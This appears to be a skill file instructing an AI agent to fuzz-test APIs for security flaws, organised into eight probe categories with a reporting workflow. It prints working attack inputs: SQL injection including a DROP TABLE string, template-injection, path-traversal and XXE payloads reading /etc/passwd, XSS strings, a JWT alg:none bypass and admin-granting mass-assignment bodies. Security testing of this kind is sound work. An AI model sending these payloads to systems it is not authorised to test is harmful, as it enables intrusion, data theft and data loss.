---
name: api-fuzz
version: 1.2.0
description: >
  Automated API security testing via structured fuzz testing and edge case generation.
  Use when asked to test an API for robustness, hidden errors, auth bypasses, or unexpected
  behavior. Parses OpenAPI/Swagger specs or maps endpoints from source code, generates
  boundary/malformed inputs across 8 attack categories, and detects 500 errors, stack traces,
  IDOR, auth bypasses, and data leaks. Every finding is verified live before reporting.
homepage: https://github.com/forgou37/qa-reports
metadata:
  {
    "nullref": {
      "emoji": "🔬",
      "category": "security",
      "requires": { "bins": ["curl", "git"] },
      "author": "nullref (https://ugig.net/u/nullref)",
      "report_format": "markdown",
      "output_dir": "qa-reports"
    }
  }
---

# API Fuzz Testing

Automated API security testing via structured fuzz testing. Finds what normal testing misses: error handling failures, hidden endpoints, broken auth, and data leaks under unexpected input.

## When to Use

✅ **USE this skill when:**
- Testing a REST or GraphQL API for robustness and security
- Looking for unhandled edge cases that expose stack traces or internal errors
- Checking whether auth is consistently enforced across all endpoints
- Verifying that boundary inputs don't crash the server or leak data
- Auditing an API before go-live or after a major refactor

## When NOT to Use

❌ **DON'T use this skill when:**
- The target is a production system with real user data and no staging environment
- You need deep SQL injection exploitation (use `security-audit` skill instead)
- The API requires complex multi-step auth flows you cannot automate (CAPTCHA, hardware tokens)
- You want static code analysis only (no live target available)

## Setup

**Requirements:** `curl`, `git` (for committing reports)

**Optional but recommended:**
```bash
# jq for parsing JSON responses
apt-get install jq

# httpie as curl alternative for cleaner output
pip install httpie
```

No API keys required — this skill tests the *target* API, not ours.

---

## Workflow

### Phase 1: Spec Discovery & Endpoint Mapping

Check for machine-readable API spec first:
```bash
# Common OpenAPI locations
curl -s --max-time 10 https://target.com/openapi.json
curl -s --max-time 10 https://target.com/swagger.json
curl -s --max-time 10 https://target.com/api/docs
curl -s --max-time 10 https://target.com/api/v1/openapi.json
```

If no spec found, extract from source code:
```bash
# Laravel / PHP
grep -rn "Route::" routes/ --include="*.php"

# Express / Node.js
grep -rn "router\.\(get\|post\|put\|delete\|patch\)" --include="*.js" --include="*.ts"

# FastAPI / Django / Flask
grep -rn "@app\.route\|@router\." --include="*.py"
```

Build endpoint inventory: `METHOD /path [auth_required] [params]`

### Phase 2: Attack Categories

Run all 8 categories against each endpoint. Log every request before sending.

**Format:** `[FUZZ:<category>] METHOD URL payload=<value> → HTTP_STATUS`

#### 1. Boundary Values
```bash
# Integer limits
?limit=0  ?limit=-1  ?limit=999999999  ?limit=2147483648
?page=-1  ?offset=-999  ?id=0

# String limits
?q=  (empty)
?q=aaaa...  (1000 chars)
?q=aaaa...  (10000 chars — potential DoS)
```

#### 2. Type Confusion
Send wrong type for every typed parameter:
```bash
# String where int expected
curl -s --max-time 10 -H "Content-Type: application/json" \
  -d '{"user_id": "not-a-number"}' https://target.com/api/users

# Array where string expected
-d '{"email": ["a@b.com", "c@d.com"]}'

# Null for required fields
-d '{"username": null, "password": null}'

# Boolean as string
-d '{"active": "true"}'  # vs true
```

#### 3. Injection Probes
```bash
# SQL injection indicators
?id=1'                         # single quote
?id=1 OR 1=1--
?id=1; DROP TABLE users--

# Template injection
?name={{7*7}}                  # SSTI check (expect: 49 in response = confirmed)
?name=<%= 7*7 %>               # ERB
?name=${7*7}                   # JS template

# Path traversal
?file=../../../etc/passwd
?path=....//....//etc/passwd   # double-encoded

# XSS probe (look for reflection in response)
?q=<script>alert(1)</script>
?q="><img src=x onerror=alert(1)>
```

#### 4. Auth Edge Cases
```bash
# No auth header at all
curl -s --max-time 10 https://target.com/api/admin/users

# Empty token
curl -s -H "Authorization: Bearer " https://target.com/api/users/me

# Malformed token
curl -s -H "Authorization: Bearer invalid.token.here" ...

# JWT with alg:none
# (decode JWT, set alg to "none", remove signature, re-encode)

# Expired token (if you have one)
curl -s -H "Authorization: Bearer <expired_token>" ...

# Token from user A accessing user B's resources (IDOR)
curl -s -H "Authorization: Bearer <token_A>" \
  https://target.com/api/users/<user_B_id>/profile
```

#### 5. Mass Assignment
For POST/PUT endpoints, send extra fields not in the documented schema:
```bash
-d '{"username": "test", "role": "admin", "is_admin": true, "verified": true}'
-d '{"price": 0.01, "discount": 99}'
-d '{"user_id": 1, "balance": 999999}'
```

#### 6. Rate Limit & DoS Probes
```bash
# Send 10 rapid requests and check if rate limiting exists
for i in $(seq 1 10); do
  curl -s -o /dev/null -w "%{http_code} " --max-time 5 \
    https://target.com/api/auth/login \
    -d '{"email":"test@test.com","password":"wrong"}'
done
# All 200s with no 429 = missing rate limiting on auth endpoint
```

#### 7. HTTP Method Abuse
```bash
# Try unexpected methods on every endpoint
curl -s -X OPTIONS --max-time 10 https://target.com/api/users
curl -s -X TRACE --max-time 10 https://target.com/api/users
curl -s -X HEAD --max-time 10 https://target.com/api/admin/export

# Method override headers
curl -s -X POST -H "X-HTTP-Method-Override: DELETE" \
  https://target.com/api/users/1
```

#### 8. Content-Type Confusion
```bash
# Send JSON as XML
curl -s -H "Content-Type: application/xml" \
  -d '<root><id>1</id></root>' https://target.com/api/users

# Send JSON as plain text
curl -s -H "Content-Type: text/plain" \
  -d '{"id":1}' https://target.com/api/users

# XXE attempt (if XML is accepted)
curl -s -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' \
  https://target.com/api/parse
```

### Phase 3: Anomaly Classification

Flag any response matching these criteria:

| Signal | Severity | Why |
|--------|----------|-----|
| HTTP 500 | High | Unhandled exception — often leaks stack trace |
| Stack trace in body | High | Reveals file paths, framework version, SQL |
| 200 on auth-required endpoint (no token) | Critical | Auth bypass |
| Different data for different users on same path | Critical | IDOR |
| `{{7*7}}` → `49` in response | Critical | SSTI confirmed |
| SQL error in response | High | Potential SQLi |
| Response time > 5s on simple query | Medium | Potential DoS / slow query |
| No 429 after 10 rapid auth requests | Medium | Missing rate limiting |
| `X-Powered-By` / `Server` header with version | Low | Tech disclosure |

### Phase 4: Structured Output

Before writing the report, emit JSON summary:

```json
{
  "target": "api-name",
  "date": "YYYY-MM-DD",
  "base_url": "https://target.com",
  "spec_found": true,
  "endpoints_tested": 24,
  "total_requests": 312,
  "findings": [
    {
      "id": "F-01",
      "title": "Unauthenticated access to admin endpoint",
      "severity": "Critical",
      "cvss": 9.1,
      "category": "Broken Access Control",
      "owasp": "A01",
      "endpoint": "GET /api/admin/users",
      "payload": "(no auth header)",
      "response_status": 200,
      "response_snippet": "{\"users\": [{\"id\": 1, \"email\": \"admin@...\"}]}",
      "confirmed": true
    }
  ],
  "summary": {
    "critical": 1,
    "high": 2,
    "medium": 3,
    "low": 1,
    "info": 2
  }
}
```

### Phase 5: Report

Save full English report to `qa-reports/<target>-api-fuzz.md`.

Report structure:
1. **Executive Summary** — 3–5 sentences, non-technical
2. **Test Scope** — endpoints tested, categories covered, total requests
3. **Finding Distribution** table
4. **Findings** — Critical → High → Medium → Low
5. **Positive Observations** — what's working well
6. **Remediation Priority Table**

Each finding must include:
- Severity + CVSS score
- OWASP category
- Exact endpoint + payload
- Live response (status + snippet, max 200 chars)
- Root cause (1–2 sentences)
- Remediation with code example

Commit report to git:
```bash
cd /path/to/workspace
git add qa-reports/<target>-api-fuzz.md
git commit -m "audit: <target> API fuzz report"
```

---

## Rules

- **English only** for all reports
- **Log every request** before sending: `[FUZZ:<category>] METHOD URL payload=...`
- **GET/HEAD only** for read endpoints on production; POST/PUT only on staging/demo
- **`--max-time 10`** on every curl request — no exceptions
- **Never send payloads that write or delete real data** on production
- **CVSS score required** for Critical and High findings
- **Mark every finding:** `Confirmed` (live-verified) or `Static` (code-only)
- If a 500 exposes a real stack trace, **do not include internal paths or secrets in the report** — summarize instead

---

## Changelog

- **1.2.0** — Added GraphQL section, XXE probes, rate limit testing, CVSS requirement
- **1.1.0** — Added mass assignment and HTTP method abuse categories
- **1.0.0** — Initial release
